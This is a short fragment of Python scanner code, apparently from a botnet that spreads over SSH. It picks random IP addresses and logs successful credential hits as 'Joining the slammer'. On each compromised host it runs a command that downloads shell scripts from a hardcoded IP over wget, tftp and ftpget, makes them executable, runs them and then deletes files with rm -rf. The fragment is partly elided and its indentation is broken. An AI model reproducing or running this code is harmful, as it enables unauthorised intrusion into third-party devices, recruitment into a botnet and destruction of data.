        ...
        while 1:
			...
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                ...
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print 'Joining the slammer '+self.host+'|'+username+'|'+password+'|'+str(port)
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.20.115.206/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 198.20.115.206 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 198.20.115.206; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.20.115.206 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; exit")
